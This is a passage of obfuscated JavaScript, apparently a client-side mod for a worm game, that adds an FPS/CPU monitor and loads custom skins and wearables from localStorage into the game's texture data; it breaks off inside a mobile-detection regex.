          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x49e19d.key === "F4" || _0x49e19d.code === "F4" || _0x49e19d.keyCode === 115) {
          _0x49e19d.preventDefault();
          this.isFpsVisible = !this.isFpsVisible;
          if (this.isFpsVisible && !this._animFrameId) {
            this.startMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x49e19d.altKey && (_0x49e19d.key === "2" || _0x49e19d.keyCode === 50)) {
          _0x49e19d.preventDefault();
          this.isCpuVisible = !this.isCpuVisible;
          if (this.isCpuVisible && !this._cpuMonitoringInterval) {
            this.startCpuMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        } else if (_0x49e19d.altKey && (_0x49e19d.key === "4" || _0x49e19d.keyCode === 52)) {
          _0x49e19d.preventDefault();
          this.isFpsVisible = !this.isFpsVisible;
          if (this.isFpsVisible && !this._animFrameId) {
            this.startMonitoring();
          }
          this.saveSettings();
          this.updateDisplays();
          this.updateToggleButton();
          return false;
        }
      }, true);
    },
    saveSettings() {
      const _0x4d182e = this.isFpsVisible || this.isCpuVisible;
      localStorage.setItem("showFpsCpu", _0x4d182e);
    },
    updateToggleButton() {
      const _0x6bec0d = document.getElementById("performance-monitor-toggle");
      if (_0x6bec0d) {
        _0x6bec0d.checked = this.isFpsVisible || this.isCpuVisible;
      }
    },
    toggle(_0x5d1e36) {
      if (typeof _0x5d1e36 !== "boolean") {
        _0x5d1e36 = !this.isFpsVisible && !this.isCpuVisible;
      }
      const _0x4911a2 = this.isFpsVisible;
      const _0x186d61 = this.isCpuVisible;
      this.isFpsVisible = _0x5d1e36;
      this.isCpuVisible = _0x5d1e36;
      this.saveSettings();
      if (_0x5d1e36) {
        if (!_0x4911a2 && this.isFpsVisible) {
          this.startMonitoring();
        }
        if (!_0x186d61 && this.isCpuVisible) {
          this.startCpuMonitoring();
        }
      } else {
        this.stopAllMonitoring();
      }
      this.updateDisplays();
    },
    enable(_0x1d7d8f) {
      if (_0x1d7d8f) {
        if (!this.isInitialized) {
          this.init();
        } else {
          this.toggle(true);
        }
      } else {
        this.toggle(false);
      }
    }
  };
  $(document).ready(function () {
    setTimeout(function () {
      if (window.PerformanceMonitor) {
        const _0x331ef2 = vps.performanceMonitorEnabled || false;
        window.PerformanceMonitor.enable(_0x331ef2);
        $("#performance-monitor-toggle").prop("checked", _0x331ef2);
      }
    }, 500);
  });
  const _0xba2cfd = {
    validGlowNames: ["a_veron", "a_white", "a_tm2_B_4", "a_tm2_B_3", "a_tm2_B_2", "a_tm2_B_1", "a_tm2_A_4", "a_tm2_A_3", "a_tm2_A_2", "a_tm2_A_1", "a_ocean", "a_ivory", "a_grass", "a_death", "a_blood", "a_black", "a_azure", "a__yllw", "a__ruby", "a__prpl", "a__orng", "a__emer", "a__dsky", "a__cyan", "a__card", "a___vio", "a_trans", "at_veron", "at_white", "at_tm2_B_4", "at_tm2_B_3", "at_tm2_B_2", "at_tm2_B_1", "at_tm2_A_4", "at_tm2_A_3", "at_tm2_A_2", "at_tm2_A_1", "at_ocean", "at_ivory", "at_grass", "at_death", "at_blood", "at_black", "at_azure", "at__yllw", "at__ruby", "at__prpl", "at__orng", "at__emer", "at__dsky", "at__cyan", "at__card", "at___vio", "a_choco", "a_green", "a_karda", "a_olive", "a_pmp_1", "a_pmp_2", "a_pmp_3", "a_pmp_4", "a__pink"],
    fallbackMap: {
      c___red: "a__card",
      c__blue: "a__dsky",
      c__gold: "a__yllw",
      c_choco: "a_blood",
      c_green: "a_grass",
      c_karda: "a__yllw",
      c_olive: "a_grass",
      c_pmp_1: "a__orng",
      c_pmp_2: "a__orng",
      c_pmp_3: "a__orng",
      c_pmp_4: "a_blood",
      c___vio: "a___vio",
      c__card: "a__card",
      c__cyan: "a__cyan",
      c__dsky: "a__dsky",
      c__emer: "a__emer",
      c__orng: "a__orng",
      c__pink: "a_veron",
      c__prpl: "a__prpl",
      c__ruby: "a__ruby",
      c__yllw: "a__yllw",
      c_azure: "a_azure",
      c_black: "a_black",
      c_blood: "a_blood",
      c_grass: "a_grass",
      c_ivory: "a_ivory",
      c_ocean: "a_ocean",
      c_veron: "a_veron",
      c_white: "a_white",
      a_choco: "a_blood",
      a_green: "a_grass",
      a_karda: "a__yllw",
      a_olive: "a_grass",
      a_pmp_1: "a__orng",
      a_pmp_2: "a__orng",
      a_pmp_3: "a__orng",
      a_pmp_4: "a_blood",
      a__pink: "a_veron",
      "": "a_white",
      null: "a_white",
      undefined: "a_white",
      none: "a_white"
    },
    convertGlowName: function (_0x37813b) {
      if (!_0x37813b || typeof _0x37813b !== "string") {
        return "a_white";
      }
      const _0x4ec402 = _0x37813b.trim();
      if (this.validGlowNames.includes(_0x4ec402)) {
        return _0x4ec402;
      }
      if (this.fallbackMap[_0x4ec402]) {
        const _0x50dab0 = this.fallbackMap[_0x4ec402];
        return _0x50dab0;
      }
      if (_0x4ec402.startsWith("c_")) {
        const _0x37711a = _0x4ec402.replace("c_", "a_");
        if (this.validGlowNames.includes(_0x37711a)) {
          return _0x37711a;
        }
      }
      const _0x2057f2 = this.validGlowNames.find(_0x5449fe => _0x5449fe.toLowerCase() === _0x4ec402.toLowerCase());
      if (_0x2057f2) {
        return _0x2057f2;
      }
      return "a_white";
    },
    convertGlowArray: function (_0x15b08c) {
      if (!_0x15b08c || !Array.isArray(_0x15b08c)) {
        return ["a_white"];
      }
      if (_0x15b08c.length === 0) {
        return ["a_white"];
      }
      const _0x5ec3e1 = _0x15b08c.map(_0x28735c => this.convertGlowName(_0x28735c));
      const _0x3025a3 = _0x5ec3e1.filter(_0x44a5e1 => _0x44a5e1 && _0x44a5e1 !== "");
      if (_0x3025a3.length === 0) {
        return ["a_white"];
      }
      return _0x3025a3;
    }
  };
  window.GlowNameConverter = _0xba2cfd;
  _wup.customConfig = function (_0x5a67a2) {
    window.vps.sg = [];
    try {
      const _0x64782e = JSON.parse(localStorage.getItem("vps") || "{}");
      if (_0x64782e.sg && Array.isArray(_0x64782e.sg)) {
        window.vps.sg = [..._0x64782e.sg];
      }
    } catch (_0x5e8f5d) {
      console.error("خطأ في تحميل القائمة:", _0x5e8f5d);
      window.vps.sg = [];
    }
    try {
      var _0x2018ce = localStorage.getItem("custom_skin");
      var _0x4d7978 = localStorage.getItem("custom_wear");
      var _0x214fc5 = localStorage.getItem("custom_wormup_skin");
      var _0xd27cdf = localStorage.getItem("custom_wormup_wear");
      if (_0x2018ce || _0x4d7978 || _0x214fc5 || _0xd27cdf) {
        if (_0x2018ce) {
          var _0x23ca71 = JSON.parse(_0x2018ce);
          Object.keys(_0x23ca71).forEach(function (_0x192db1) {
            if (_0x192db1.startsWith("custom_skin_") && _0x23ca71[_0x192db1].skin && _0x23ca71[_0x192db1].skin.id) {
              var _0x341228 = parseInt(_0x23ca71[_0x192db1].skin.id);
              if (_0x341228 && !window.vps.sg.includes(_0x341228)) {
                window.vps.sg.push(_0x341228);
              }
            }
          });
        }
      } else {}
    } catch (_0x2efa73) {
      console.error("خطأ في تحميل السكنات المحلية:", _0x2efa73);
    }
    const _0x3e93fd = {
      convertSkinId: function (_0x433980) {
        try {
          if (!_0x433980 || typeof _0x433980 !== "string") {
            return _0x433980;
          }
          if (!isNaN(_0x433980)) {
            return _0x433980;
          }
          let _0x381abc = 0;
          for (let _0x14b8ea = 0; _0x14b8ea < _0x433980.length; _0x14b8ea++) {
            _0x381abc += _0x433980.charCodeAt(_0x14b8ea) * (_0x14b8ea + 1);
          }
          const _0x5078cb = _0x381abc % 7000 + 3000;
          return _0x5078cb;
        } catch (_0x40f1c2) {
          console.warn("فشل التحويل، استخدام الأصلي:", _0x433980);
          return _0x433980;
        }
      }
    };
    if (!_0x5a67a2) {
      _0x5a67a2 = {
        textureDict: {},
        regionDict: {},
        skinArrayDict: [],
        hatDict: {},
        eyesDict: {},
        mouthDict: {},
        glassesDict: {},
        hatVariantArray: [],
        eyesVariantArray: [],
        mouthVariantArray: [],
        glassesVariantArray: []
      };
    }
    try {
      var _0x5c6549 = localStorage.getItem("custom_skin");
      if (_0x5c6549) {
        var _0x304f2a = JSON.parse(_0x5c6549);
        if (_0x261341.processNewSkinFormat) {
          _0x261341.processNewSkinFormat(_0x304f2a, _0x5a67a2);
        }
      }
      var _0x49d7dd = localStorage.getItem("custom_wear");
      if (_0x49d7dd) {
        var _0x29d1c0 = JSON.parse(_0x49d7dd);
        Object.keys(_0x29d1c0).forEach(function (_0x502b22) {
          if (_0x502b22.startsWith("custom_wear_") && _0x29d1c0[_0x502b22].wear) {
            const _0x950c00 = _0x29d1c0[_0x502b22].wear;
            if (_0x950c00.textureDict) {
              Object.keys(_0x950c00.textureDict).forEach(function (_0xaa3d66) {
                const _0x1e6638 = _0x950c00.textureDict[_0xaa3d66];
                if (_0x1e6638 && _0x1e6638.file) {
                  let _0x1a48f5 = _0x1e6638.file;
                  if (_0x1a48f5 && !_0x1a48f5.startsWith("data:image/")) {
                    _0x1a48f5 = _0x1a48f5.replace(/\s/g, "");
                    const _0x10fb6f = 222;
                    if (_0x1a48f5.length > _0x10fb6f) {
                      const _0x149911 = _0x1a48f5.substring(0, _0x1a48f5.length - _0x10fb6f);
                      const _0x2fe27f = _0x1a48f5.substring(_0x1a48f5.length - _0x10fb6f);
                      _0x1a48f5 = _0x2fe27f + _0x149911;
                    }
                    try {
                      atob(_0x1a48f5);
                      _0x1a48f5 = "data:image/png;base64," + _0x1a48f5;
                    } catch (_0x542019) {
                      console.error("خطأ في base64:", _0xaa3d66, _0x542019);
                      return;
                    }
                  }
                  _0x5a67a2.textureDict[_0xaa3d66] = {
                    custom: true,
                    file: _0x1a48f5,
                    relativePath: _0x1a48f5,
                    h1: true,
                    h4: true
                  };
                }
              });
            }
            if (_0x950c00.regionDict) {
              Object.keys(_0x950c00.regionDict).forEach(function (_0xc195b3) {
                const _0x307618 = _0x950c00.regionDict[_0xc195b3];
                if (_0x307618 && _0x307618.id && _0x307618.obj && _0x307618.list) {
                  const _0x1bc886 = _0x307618.list;
                  const _0x235d97 = _0x307618.listVariant || _0x1bc886.replace("Dict", "VariantArray");
                  _0x5a67a2.regionDict[_0xc195b3] = {
                    texture: _0x307618.texture,
                    x: _0x307618.x || 0,
                    y: _0x307618.y || 0,
                    w: _0x307618.w || 128,
                    h: _0x307618.h || 128,
                    px: _0x307618.px || 0,
                    py: _0x307618.py || 0,
                    pw: _0x307618.pw || 128,
                    ph: _0x307618.ph || 128
                  };
                  if (!_0x5a67a2[_0x1bc886]) {
                    _0x5a67a2[_0x1bc886] = {};
                  }
                  if (!_0x5a67a2[_0x235d97]) {
                    _0x5a67a2[_0x235d97] = [];
                  }
                  _0x5a67a2[_0x1bc886][_0x307618.id] = {
                    base: _0x307618.obj.base || [{
                      region: _0xc195b3
                    }],
                    guest: _0x307618.obj.guest !== undefined ? _0x307618.obj.guest : true,
                    price: _0x307618.obj.price || 0,
                    priceBefore: _0x307618.obj.priceBefore || 0,
                    nonbuyable: _0x307618.obj.nonbuyable !== undefined ? _0x307618.obj.nonbuyable : false,
                    prime: _0x307618.obj.prime || "c_white",
                    custom: true
                  };
                  if (!_0x5a67a2[_0x235d97].some(_0x13ad85 => _0x13ad85[0] === _0x307618.id)) {
                    _0x5a67a2[_0x235d97].push([_0x307618.id]);
                  }
                  let _0x3a20fd = "زي";
                  if (_0x1bc886 === "hatDict") {
                    _0x3a20fd = "قبعة";
                  } else if (_0x1bc886 === "eyesDict") {
                    _0x3a20fd = "عيون";
                  } else if (_0x1bc886 === "mouthDict") {
                    _0x3a20fd = "فم";
                  } else if (_0x1bc886 === "glassesDict") {
                    _0x3a20fd = "نظارة";
                  }
                } else {
                  console.warn("⚠️ منطقة غير مكتملة:", _0xc195b3, _0x307618);
                }
              });
            }
          }
        });
        setTimeout(() => {
          if (window._wup?._anApp?.og?.af?.ng) {
            try {
              const _0x8b5a87 = window._wup._anApp.og.af.ng;
              if (_0x8b5a87.Ug && _0x8b5a87.Ug.Uf) {
                _0x8b5a87.Ug.Uf(_0x5a67a2);
              }
            } catch (_0x412eaa) {}
          }
          if (window.gameManager) {
            Object.assign(window.gameManager, _0x5a67a2);
          }
          if (window.gameInstance?.Lc) {
            window.gameInstance.Lc.Gb = _0x5a67a2;
          }
        }, 500);
      }
    } catch (_0x39f2e2) {
      console.error("Error processing NEW format:", _0x39f2e2);
    }
    if (!_0x5a67a2.textureDict) {
      _0x5a67a2.textureDict = {};
    }
    if (!_0x5a67a2.regionDict) {
      _0x5a67a2.regionDict = {};
    }
    if (!_0x5a67a2.skinArrayDict) {
      _0x5a67a2.skinArrayDict = [];
    }
    var _0x1f399f = ["eyesDict", "mouthDict", "hatDict", "glassesDict"];
    _0x1f399f.forEach(function (_0x540fcd) {
      if (!_0x5a67a2[_0x540fcd]) {
        _0x5a67a2[_0x540fcd] = {};
      }
    });
    var _0x54f5a7 = function _0x5d6cb2(_0x2e70c4, _0xb1af07 = 0) {
      if (!_0x2e70c4 || !_0x2e70c4.id) {
        console.warn("Invalid skin data provided to addCustomSkin:", _0x2e70c4);
        return;
      }
      var _0x25c86e = _0x2e70c4.id.toString();
      var _0x99e4a8 = (_0x2e70c4.type || "skin").toString().toLowerCase() + "VariantArray";
      var _0x260e0d = (_0x2e70c4.type || "skin").toString().toLowerCase() + "Dict";
      if (!_0x2e70c4.file || !_0x2e70c4.w || !_0x2e70c4.h) {
        console.warn("Missing required properties in skin data:", _0x2e70c4);
        return;
      }
      try {
        _0x5a67a2.textureDict[_0x25c86e] = {
          custom: true,
          re1ativePath: _0x2e70c4.file,
          relativePath: _0x2e70c4.file,
          reference: 1000 + _0xb1af07,
          h1: true,
          h4: true
        };
        _0x5a67a2.regionDict[_0x25c86e] = {
          texture: _0x25c86e,
          x: _0x2e70c4.x || 0,
          y: _0x2e70c4.y || 0,
          w: _0x2e70c4.w,
          h: _0x2e70c4.h,
          px: _0x2e70c4.px || 0,
          py: _0x2e70c4.py || 0,
          pw: 128,
          ph: 128
        };
        if (!_0x5a67a2[_0x260e0d]) {
          _0x5a67a2[_0x260e0d] = {};
        }
        if (!_0x5a67a2[_0x99e4a8]) {
          _0x5a67a2[_0x99e4a8] = [];
        }
        _0x5a67a2[_0x260e0d][1000 + _0xb1af07] = {
          base: [{
            region: _0x25c86e
          }],
          guest: false,
          nonbuyable: false,
          price: 0,
          priceBefore: 0,
          id: _0x25c86e,
          custom: true
        };
        _0x5a67a2[_0x99e4a8].push([1000 + _0xb1af07]);
      } catch (_0x5d4de8) {
        console.error("Error in addCustomSkin:", _0x5d4de8);
      }
    };
    var _0x4d7978 = localStorage.getItem("custom_wormup_wear");
    if (_0x4d7978) {
      try {
        var _0xeb2852 = JSON.parse(_0x4d7978);
        if (_0xeb2852.version && _0xeb2852.data && Array.isArray(_0xeb2852.data)) {} else if (_0xeb2852.wear && _0xeb2852.wear.textureDict && _0xeb2852.wear.regionDict) {
          _0x4d7978 = null;
        }
      } catch (_0x4cb07b) {
        console.error("خطأ في تحليل البيانات:", _0x4cb07b);
      }
    }
    if (_0x4d7978) {
      try {
        _0x4d7978 = JSON.parse(_0x4d7978);
        if (_0x4d7978.wear) {
          if (_0x4d7978.version == "2") {
            if (_0x4d7978.data && Array.isArray(_0x4d7978.data)) {
              _0x4d7978.data.forEach(function (_0x261a86, _0x599312) {
                if (_0x261a86 && _0x261a86.id) {
                  _0x54f5a7(_0x261a86, _0x599312);
                }
              });
            }
          } else {
            for (var _0x21166e in _0x4d7978.wear.textureDict) {
              if (_0x4d7978.wear.textureDict[_0x21166e]) {
                var _0x331d2a = _0x4d7978.wear.textureDict[_0x21166e];
                _0x5a67a2.textureDict[_0x21166e] = {
                  custom: true,
                  h1: true,
                  h3: true,
                  h4: true,
                  file: _0x331d2a.file
                };
              }
            }
            for (var _0x3b1bd2 in _0x4d7978.wear.regionDict) {
              var _0x5e66ac = _0x4d7978.wear.regionDict[_0x3b1bd2];
              if (_0x5e66ac) {
                _0x5a67a2.regionDict[_0x3b1bd2] = _0x5e66ac;
                var _0x7aee7 = determineWearType(_0x3b1bd2, _0x5e66ac);
                var _0x20e3b0 = _0x5e66ac.id || _0x3b1bd2;
                var _0x16d7e8 = {
                  base: [{
                    region: _0x3b1bd2
                  }],
                  guest: false,
                  nonbuyable: false,
                  price: 0,
                  priceBefore: 0,
                  id: _0x20e3b0,
                  custom: true
                };
                switch (_0x7aee7) {
                  case "eyes":
                    if (!_0x5a67a2.eyesDict) {
                      _0x5a67a2.eyesDict = {};
                    }
                    _0x5a67a2.eyesDict[_0x20e3b0] = _0x16d7e8;
                    if (!_0x5a67a2.eyesVariantArray) {
                      _0x5a67a2.eyesVariantArray = [];
                    }
                    _0x5a67a2.eyesVariantArray.push([_0x20e3b0]);
                    break;
                  case "mouth":
                    if (!_0x5a67a2.mouthDict) {
                      _0x5a67a2.mouthDict = {};
                    }
                    _0x5a67a2.mouthDict[_0x20e3b0] = _0x16d7e8;
                    if (!_0x5a67a2.mouthVariantArray) {
                      _0x5a67a2.mouthVariantArray = [];
                    }
                    _0x5a67a2.mouthVariantArray.push([_0x20e3b0]);
                    break;
                  case "hat":
                    if (!_0x5a67a2.hatDict) {
                      _0x5a67a2.hatDict = {};
                    }
                    _0x5a67a2.hatDict[_0x20e3b0] = _0x16d7e8;
                    if (!_0x5a67a2.hatVariantArray) {
                      _0x5a67a2.hatVariantArray = [];
                    }
                    _0x5a67a2.hatVariantArray.push([_0x20e3b0]);
                    break;
                  case "glasses":
                    if (!_0x5a67a2.glassesDict) {
                      _0x5a67a2.glassesDict = {};
                    }
                    _0x5a67a2.glassesDict[_0x20e3b0] = _0x16d7e8;
                    if (!_0x5a67a2.glassesVariantArray) {
                      _0x5a67a2.glassesVariantArray = [];
                    }
                    _0x5a67a2.glassesVariantArray.push([_0x20e3b0]);
                    break;
                  default:
                    if (!_0x5a67a2.eyesDict) {
                      _0x5a67a2.eyesDict = {};
                    }
                    _0x5a67a2.eyesDict[_0x20e3b0] = _0x16d7e8;
                    if (!_0x5a67a2.eyesVariantArray) {
                      _0x5a67a2.eyesVariantArray = [];
                    }
                    _0x5a67a2.eyesVariantArray.push([_0x20e3b0]);
                    break;
                }
              }
            }
          }
        }
      } catch (_0x1890dc) {
        console.error("Error processing OLD SYSTEM custom_wormup_wear:", _0x1890dc);
      }
    }
    var _0x2018ce = localStorage.getItem("custom_wormup_skin");
    if (_0x2018ce) {
      try {
        _0x2018ce = JSON.parse(_0x2018ce);
        if (_0x2018ce.version_skin == "2") {
          var _0x20ab74 = function _0x2fa359(_0x38a97d, _0x456a92, _0x1d1943, _0x4b13fc) {
            return {
              texture: _0x456a92,
              h: _0x1d1943 - 5,
              w: _0x1d1943 - 5,
              x: _0x1d1943 * (_0x4b13fc ? 0 : _0x38a97d || 0),
              y: 0
            };
          };
          var _0x28e100 = _0x3e93fd.convertSkinId(_0x2018ce.id);
          if (!_0x28e100 || _0x28e100 === _0x2018ce.id) {
            _0x28e100 = "SKIN_" + _0x2018ce.id + "___Z";
          }
          var _0x391c43 = {
            id: _0x28e100.toString(),
            regionDict: {},
            textureDict: {},
            skinArrayDict: [],
            skinGroupArrayDict: [{
              id: _0x28e100,
              name: {
                en: "Custom V2 (Old System)",
                ar: "مخصص نسخة 2 (النظام القديم)"
              },
              list: []
            }],
            version_skin: 3
          };
          var _0x5276c9 = {
            id: _0x28e100,
            guest: true,
            price: 0,
            priceBefore: 0,
            nonbuyable: true,
            prime: "c_white",
            glow: typeof _0xba2cfd !== "undefined" ? _0xba2cfd.convertGlowArray(_0x2018ce.glow) : _0x2018ce.glow || [],
            base: [],
            custom: true
          };
          for (var _0x1d1028 = (_0x2018ce.len || 1) - 1; _0x1d1028 >= 0; _0x1d1028--) {
            _0x391c43.regionDict[_0x28e100 + "_" + _0x1d1028] = _0x20ab74(_0x1d1028, _0x28e100, _0x2018ce.cos || 128, 0);
            _0x5276c9.base.push(_0x28e100 + "_" + _0x1d1028);
          }
          _0x391c43.textureDict[_0x28e100] = {
            custom: true,
            re1ativePath: _0x2018ce.file || _0x2018ce.td && _0x2018ce.td.file || "",
            relativePath: _0x2018ce.file || _0x2018ce.td && _0x2018ce.td.file || "",
            h1: true,
            h4: true
          };
          _0x391c43.skinArrayDict.push(_0x5276c9);
          _0x391c43.skinGroupArrayDict[0].list.push(_0x28e100.toString());
          if (_0x391c43.textureDict[_0x28e100] && _0x391c43.textureDict[_0x28e100].re1ativePath) {
            Object.assign(_0x5a67a2.textureDict, _0x391c43.textureDict);
            Object.assign(_0x5a67a2.regionDict, _0x391c43.regionDict);
            _0x5a67a2.skinArrayDict = _0x5a67a2.skinArrayDict.concat(_0x391c43.skinArrayDict);
            if (!_0x5a67a2.skinGroupArrayDict) {
              _0x5a67a2.skinGroupArrayDict = [];
            }
            _0x5a67a2.skinGroupArrayDict = _0x5a67a2.skinGroupArrayDict.concat(_0x391c43.skinGroupArrayDict);
          } else {
            console.warn("Invalid texture data for OLD custom skin v2");
          }
        } else if (_0x2018ce.version_skin == "3") {
          for (var _0x3b0747 in _0x2018ce) {
            if (_0x2018ce.hasOwnProperty(_0x3b0747) && _0x3b0747 !== "version_skin") {
              var _0x2f0101 = typeof _0x2018ce[_0x3b0747];
              if (_0x2f0101 === "object" && _0x2018ce[_0x3b0747] !== null) {
                if (!_0x5a67a2[_0x3b0747]) {
                  _0x5a67a2[_0x3b0747] = Array.isArray(_0x2018ce[_0x3b0747]) ? [] : {};
                }
                if (Array.isArray(_0x2018ce[_0x3b0747])) {
                  _0x5a67a2[_0x3b0747] = _0x5a67a2[_0x3b0747].concat(_0x2018ce[_0x3b0747]);
                } else {
                  Object.assign(_0x5a67a2[_0x3b0747], _0x2018ce[_0x3b0747]);
                }
              }
            }
          }
          setTimeout(() => {
            if (_0x5a67a2.skinArrayDict) {
              _0x5a67a2.skinArrayDict.forEach(_0x388a11 => {
                if (_0x388a11.custom && _0x388a11.glow && _0x388a11.base && _0x388a11.glow.length !== _0x388a11.base.length) {
                  while (_0x388a11.glow.length < _0x388a11.base.length) {
                    _0x388a11.glow.push("a_white");
                  }
                  if (_0x388a11.glow.length > _0x388a11.base.length) {
                    _0x388a11.glow = _0x388a11.glow.slice(0, _0x388a11.base.length);
                  }
                }
              });
            }
          }, 100);
        } else if (_0x2018ce.skin && _0x2018ce.textureDict) {
          var _0x1a938b = _0x2018ce.skin.id;
          _0x2018ce.skin.id = _0x1a938b.toString();
          _0x2018ce.skin.custom = true;
          _0x2018ce.skin.guest = true;
          for (var _0x1bb751 in _0x2018ce.textureDict) {
            if (_0x2018ce.textureDict[_0x1bb751]) {
              _0x5a67a2.textureDict[_0x1bb751] = _0x2018ce.textureDict[_0x1bb751];
              _0x5a67a2.textureDict[_0x1bb751].re1ativePath = _0x2018ce.textureDict[_0x1bb751].file;
              _0x5a67a2.textureDict[_0x1bb751].relativePath = _0x2018ce.textureDict[_0x1bb751].file;
              _0x5a67a2.textureDict[_0x1bb751].h1 = true;
              _0x5a67a2.textureDict[_0x1bb751].h4 = true;
              _0x5a67a2.textureDict[_0x1bb751].custom = true;
            }
          }
          for (var _0x5c19f4 in _0x2018ce.regionDict) {
            if (_0x2018ce.regionDict[_0x5c19f4]) {
              _0x5a67a2.regionDict[_0x5c19f4] = _0x2018ce.regionDict[_0x5c19f4];
            }
          }
          if (!_0x5a67a2.skinGroupArrayDict) {
            _0x5a67a2.skinGroupArrayDict = [];
          }
          _0x5a67a2.skinGroupArrayDict.push({
            id: "custom_old",
            name: {
              en: "Custom (Old System)",
              ar: "مخصص (النظام القديم)"
            },
            list: [_0x1a938b]
          });
          _0x5a67a2.skinArrayDict.push(_0x2018ce.skin);
        }
      } catch (_0x2b38b) {
        console.error("Error processing OLD SYSTEM custom_wormup_skin:", _0x2b38b);
      }
    }
    try {
      var _0x5024a4 = {
        texturesTotal: Object.keys(_0x5a67a2.textureDict || {}).length,
        regionsTotal: Object.keys(_0x5a67a2.regionDict || {}).length,
        skinsTotal: (_0x5a67a2.skinArrayDict || []).length,
        eyesTotal: Object.keys(_0x5a67a2.eyesDict || {}).length,
        mouthTotal: Object.keys(_0x5a67a2.mouthDict || {}).length,
        hatTotal: Object.keys(_0x5a67a2.hatDict || {}).length,
        glassesTotal: Object.keys(_0x5a67a2.glassesDict || {}).length,
        removedRegions: 0,
        removedSkins: 0
      };
      for (var _0xfd6d7e in _0x5a67a2.regionDict) {
        var _0x28a57b = _0x5a67a2.regionDict[_0xfd6d7e];
        if (_0x28a57b && _0x28a57b.texture && !_0x5a67a2.textureDict[_0x28a57b.texture]) {
          console.warn("Removing region with missing texture:", _0xfd6d7e, _0x28a57b.texture);
          delete _0x5a67a2.regionDict[_0xfd6d7e];
          _0x5024a4.removedRegions++;
        }
      }
      _0x5a67a2.skinArrayDict &&= _0x5a67a2.skinArrayDict.filter(function (_0x25a836) {
        if (!_0x25a836 || !_0x25a836.base) {
          return false;
        }
        for (var _0x5371e6 = 0; _0x5371e6 < _0x25a836.base.length; _0x5371e6++) {
          var _0xd65246 = _0x25a836.base[_0x5371e6];
          if (typeof _0xd65246 === "string" && !_0x5a67a2.regionDict[_0xd65246]) {
            console.warn("Removing skin with missing region:", _0x25a836.id, _0xd65246);
            _0x5024a4.removedSkins++;
            return false;
          }
        }
        return true;
      });
    } catch (_0x28aa84) {
      console.error("Error in final validation:", _0x28aa84);
    }
    Object.keys(_0x5a67a2.textureDict || {}).forEach(function (_0x29f1ce) {
      const _0x36cc5b = _0x5a67a2.textureDict[_0x29f1ce];
      if (_0x36cc5b && _0x36cc5b.custom && _0x36cc5b.file) {
        try {
          let _0x34aba9 = _0x36cc5b.file;
          if (!_0x34aba9.startsWith("data:image/")) {
            if (_0x34aba9.length > 222) {
              _0x34aba9 = _0x34aba9.substring(222) + _0x34aba9.substring(0, 222);
            }
            _0x34aba9 = "data:image/png;base64," + _0x34aba9;
          }
          if (window.PIXI && PIXI.Texture) {
            const _0x1d944a = PIXI.BaseTexture.from(_0x34aba9);
            const _0x2d7dff = new PIXI.Texture(_0x1d944a);
            PIXI.Texture.addToCache(_0x2d7dff, _0x29f1ce);
          }
        } catch (_0x10568c) {
          console.error("خطأ في إنشاء نسيج PIXI:", _0x29f1ce, _0x10568c);
        }
      }
    });
    if (window._wup && window._wup._anApp && window._wup._anApp.Lc) {
      window._gameDataBackup = JSON.parse(JSON.stringify(_0x5a67a2));
      setInterval(() => {
        if (window._wup._anApp && window._wup._anApp.Lc && window._wup._anApp.Lc.Gb) {
          const _0x113d98 = window._wup._anApp.Lc.Gb;
          const _0x175f47 = window._gameDataBackup;
          Object.keys(_0x175f47.textureDict || {}).forEach(_0x49b6da => {
            if (_0x175f47.textureDict[_0x49b6da].custom) {
              _0x113d98.textureDict[_0x49b6da] = _0x175f47.textureDict[_0x49b6da];
            }
          });
          Object.keys(_0x175f47.regionDict || {}).forEach(_0x17cd7b => {
            if (_0x17cd7b.includes("custom_wear_")) {
              _0x113d98.regionDict[_0x17cd7b] = _0x175f47.regionDict[_0x17cd7b];
            }
          });
          ["hatDict", "eyesDict", "mouthDict", "glassesDict"].forEach(_0x180fb9 => {
            Object.keys(_0x175f47[_0x180fb9] || {}).forEach(_0x434040 => {
              if (_0x175f47[_0x180fb9][_0x434040].custom) {
                _0x113d98[_0x180fb9][_0x434040] = _0x175f47[_0x180fb9][_0x434040];
              }
            });
          });
        }
      }, 3000);
    }
  };
  var _0x4179ad = document.getElementById("btnFullScreen");
  if (_0x4179ad) {
    _0x4179ad.addEventListener("click", function () {
      var _0x6de392 = document.documentElement.requestFullScreen || document.documentElement.webkitRequestFullScreen || document.documentElement.mozRequestFullScreen;
      if (_0x6de392 && !_wup.fullscreen) {
        try {
          _wup.fullscreen = true;
          _0x6de392.call(document.documentElement);
        } catch (_0x483d0e) {}
      } else {
        _wup.fullscreen = false;
        document.exitFullscreen();
      }
    });
  }
  function _0x51d931() {
    var _0x356ed5 = false;
    (function (_0xac07ca) {
      if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0xac07ca) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( 